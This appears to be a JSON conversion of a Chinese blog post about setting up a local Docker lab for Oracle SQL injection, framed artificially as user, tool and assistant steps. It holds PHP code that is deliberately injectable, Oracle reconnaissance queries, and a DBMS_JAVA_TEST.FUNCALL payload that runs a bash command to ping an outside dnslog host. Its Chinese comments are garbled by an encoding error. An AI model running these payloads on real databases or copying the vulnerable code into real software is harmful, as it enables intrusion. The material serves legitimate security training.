@@ -1,0 +1,137 @@
+{
+    "_source_md":  "sql injection/2020-10-29-SQL-INJECTION.md",
+    "version":  "sql-injection-oracle-analysis",
+    "title":  {
+                  "zh":  "SQL注入原理分析：Oracle数据库靶场搭建",
+                  "en":  "SQL Injection Analysis: Oracle Database Lab Setup"
+              },
+    "description":  {
+                        "zh":  "使用Docker搭建Oracle数据库SQL注入靶场，包含Apache+PHP+Oracle完整环境。",
+                        "en":  "Use Docker to build Oracle database SQL injection lab, including complete Apache+PHP+Oracle environment."
+                    },
+    "steps":  [
+                  {
+                      "type":  "user_message",
+                      "content":  {
+                                      "zh":  "搭建Oracle SQL注入靶场",
+                                      "en":  "Build Oracle SQL injection lab"
+                                  },
+                      "annotation":  {
+                                         "zh":  "用户执行操作",
+                                         "en":  "用户执行操作"
+                                     },
+                      "codeBlocks":  [
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "#docker涓嬭浇oracle鏁版嵁搴撻暅鍍?docker pull registry.cn-hangzhou.aliyuncs.com/qida/oracle-xe-11g\n#docker灏嗛暅鍍忓姞杞藉埌鍚嶇О涓簅racle鐨勫鍣ㄥ悗鍙拌繍琛岋紝骞舵槧灏勯暅鍍?521绔彛鍒版湰鍦?521绔彛\ndocker run -d -p 1521:1521 --name oracle registry.cn-hangzhou.aliyuncs.com/qida/oracle-xe-11g\n#杩涘叆oracle瀹瑰櫒鐨勪氦浜掑紡shell\ndocker exec -it oracle bash\n\nroot@bd849e50bab4:/# sqlplus /nolog\nSQL\u003e conn sys/oracle as sysdba\nConnected.\n\nSQL\u003e select name from v$database;\n\nNAME\n---------\n\nXE",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "#寮€杈熺┖闂村缓搴?SQL\u003e create tablespace pentest datafile \u0027/tmp/pentest.dbf\u0027 size 100m;\n\nTablespace created.\n\n#鍒涘缓pentest鐢ㄦ埛锛屽瘑鐮乸entest锛涢粯璁able鏄痯entest\nSQL\u003e create user pentest identified by pentest default tablespace pentest;\n\nUser created.\n#璧嬫潈pentest - connect,resource,dba\nSQL\u003e grant connect,resource,dba to pentest;\n\nGrant succeeded.\n\nSQL\u003e exit\nDisconnected from Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production\n#pentest鐢ㄦ埛杩炴帴\nroot@bd849e50bab4:/# sqlplus pentest/pentest\n\nSQL*Plus: Release 11.2.0.2.0 Production on Fri Feb 19 06:38:04 2021\n\nCopyright (c) 1982, 2011, Oracle.  All rights reserved.\n\n\nConnected to:\nOracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "#寤鸿〃\nSQL\u003e CREATE TABLE users (id number,name varchar(500),surname varchar(1000));\n\nTable created.\n#瀵煎叆鏁版嵁\nSQL\u003e INSERT INTO users (id, name, surname) VALUES (1, \u0027luther\u0027, \u0027blisset\u0027);\nINSERT INTO users (id, name, surname) VALUES (2, \u0027fluffy\u0027, \u0027bunny\u0027);\nINSERT INTO users (id, name, surname) VALUES (3, \u0027wu\u0027, \u0027ming\u0027);\nINSERT INTO users (id, name, surname) VALUES (4, \u0027sqlmap/1.0-dev (http://sqlmap.org)\u0027, \u0027user agent header\u0027);\nINSERT INTO users (id, name, surname) VALUES (5, NULL, \u0027nameisnull\u0027);\ncommit;\n1 row created.\n\nSQL\u003e\n1 row created.\n\nSQL\u003e\n1 row created.\n\nSQL\u003e\n1 row created.\n\nSQL\u003e\n1 row created.\n\nSQL\u003e commit;\n\nCommit complete.\n\nSQL\u003e SELECT * FROM users where id=1;\n\n\tID\n----------\nNAME\n--------------------------------------------------------------------------------\nSURNAME\n--------------------------------------------------------------------------------\n\t 1\nluther\nblisset",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "docker pull thomasbisignani/docker-apache-php-oracle\ncd ~/learn/docker\nmkdir oracle_samplePages \u0026\u0026 cd oracle_samplePages\ntouch index.php \n########\n##閰嶇疆docker-apache-php-oracle杩欎釜闀滃儚鍚姩鏃讹細\n##1銆?v :瀹夸富鏈烘枃浠跺す/Users/bin4xin/learn/docker/oracle_samplePages涓枃浠跺彲鍦ㄨ櫄鎷熸満鏂囦欢澶?var/www/html涓璁块棶鍒帮紱鍗筹細\n########瀹夸富鏈?Users/bin4xin/learn/docker/oracle_samplePages鏂囦欢澶逛负docker-apache-php-oracle web鏈嶅姟鐨勬牴鐩綍\n##2銆?p :鏄犲皠docker 80 绔彛鍒版湰鏈虹殑8090绔彛涓嬶紱\n##3銆?d :鍚庡彴杩愯\n########\ndocker run -p 8090:80 -d -v /Users/bin4xin/learn/docker/oracle_samplePages:/var/www/html thomasbisignani/docker-apache-php-oracle",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "cat index.php                      \n\u003c?php\n\n$username = \u0027pentest\u0027;\n$password = \u0027pentest\u0027;\n\n$connectText = \u0027//127.0.0.1:1521/XE\u0027;\n\n$conn = oci_connect($username, $password, $connectText);\nif (!$conn) {\n    $e = oci_error();\n    echo \u0027Oracle connect failed \u003cbr /\u003e\u0027;\n    exit($e[\u0027message\u0027]);\n}\n\necho \u0027Oracle connect ok\u0027.\"\u003cbr\u003e\";\n?\u003e",
+                                             "language":  "php"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "\u003c?php\n\n$username = \u0027pentest\u0027;\n$password = \u0027pentest\u0027;\n\n$connectText = \u0027//127.0.0.1:1521/XE\u0027;\n $conn = oci_connect($username, $password, $connectText);\n if (!$conn) {\n     $e = oci_error();\n     echo \u0027Oracle connect failed \u003cbr /\u003e\u0027;\n     exit($e[\u0027message\u0027]);\n }\n echo \u0027Oracle connect ok\u0027 . \"\u003cbr\u003e\";\n // Prepare the statement\n if (!isset($_GET[\u0027id\u0027]) || $_GET[\u0027id\u0027] == null) {\n     echo \"oracle sqlinjection test: oracle_test.php?id=1\u003c/br\u003e\";\n     $stid = oci_parse($conn, \"select * from USERS\");\n } else {\n     //SQL injection!!!!!!\n     $stid = oci_parse($conn, \"SELECT * FROM users where id=\" . $_GET[\u0027id\u0027]);\n }\n if (!$stid) {\n     $e = oci_error($conn);\n     exit($e[\u0027message\u0027]);\n }\n // Perform the logic of the query\n $r = oci_execute($stid);\n if (!$r) {\n     $e = oci_error($stid);\n     exit($e[\u0027message\u0027]);\n }\n // Fetch the results of the query\n print \"\u003ctable border=\u00271\u0027\u003e\\n\";\n while ($row = oci_fetch_array($stid, OCI_ASSOC+OCI_RETURN_NULLS)) {\n     print \"\u003ctr\u003e\\n\";\n     foreach ($row as $item) {\n         $item = ($item !== null ? mb_convert_encoding($item, \u0027utf-8\u0027, \u0027gbk\u0027) : \" \");\n         print \"    \u003ctd\u003e\" . $item . \"\u003c/td\u003e\\n\";\n     }\n     print \"\u003c/tr\u003e\\n\";\n }\n print \"\u003c/table\u003e\\n\";\n oci_free_statement($stid);\n oci_close($conn);\n ?\u003e",
+                                             "language":  "php"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "# 褰撳墠鐢ㄦ埛鏉冮檺\nselect * from session_roles\n# 褰撳墠鏁版嵁搴撶増鏈?select banner from sys.v_$version where rownum=1\n# 鏈嶅姟鍣ㄥ嚭鍙P\n鐢╱tl_http.request 鍙互瀹炵幇\n# 鏈嶅姟鍣ㄧ洃鍚琁P鍦板潃\nselect utl_inaddr.get_host_address from dual\n# 鏈嶅姟鍣ㄦ搷浣滅郴缁?select member from v$logfile where rownum=1\n# 鏈嶅姟鍣╯id鏌ヨ锛岃繙绋嬭繛鎺ョ殑璇濋渶瑕?select instance_name fromv$instance;\n# 褰撳墠杩炴帴鐢ㄦ埛\nselect SYS_CONTEXT (\u0027USERENV\u0027, \u0027CURRENT_USER\u0027)from dual",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "Select DBMS_JAVA_TEST.FUNCALL(\u0027oracle/aurora/util/Wrapper\u0027,\u0027main\u0027,\u0027/bin/bash\u0027,\u0027-c\u0027,\u0027ping ojuht0.dnslog.cn\u0027) from dual;",
+                                             "language":  "bash"
+                                         }
+                                     ]
+                  },
+                  {
+                      "type":  "tool_result",
+                      "toolName":  "exec",
+                      "content":  {
+                                      "zh":  "Oracle服务启动：docker pull registry.cn-hangzhou.aliyuncs.com/qida/oracle-xe-11g",
+                                      "en":  "Oracle service startup: docker pull registry.cn-hangzhou.aliyuncs.com/qida/oracle-xe-11g"
+                                  },
+                      "annotation":  {
+                                         "zh":  "工具执行结果",
+                                         "en":  "工具执行结果"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "数据库配置：创建pentest表空间，创建pentest用户并赋权connect,resource,dba",
+                                      "en":  "Database config: Create pentest tablespace, create pentest user and grant connect,resource,dba privileges"
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手响应",
+                                         "en":  "助手响应"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "WEB服务：docker-apache-php-oracle镜像，PHP使用oci_connect连接数据库",
+                                      "en":  "WEB service: docker-apache-php-oracle image, PHP uses oci_connect to connect database"
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手响应",
+                                         "en":  "助手响应"
+                                     }
+                  },
+                  {
+                      "type":  "tool_result",
+                      "toolName":  "exec",
+                      "content":  {
+                                      "zh":  "SQLMAP注入成功，可获取数据库信息",
+                                      "en":  "SQLMAP injection successful, database info retrieved"
+                                  },
+                      "annotation":  {
+                                         "zh":  "工具执行结果",
+                                         "en":  "工具执行结果"
+                                     }
+                  }
+              ]
+}
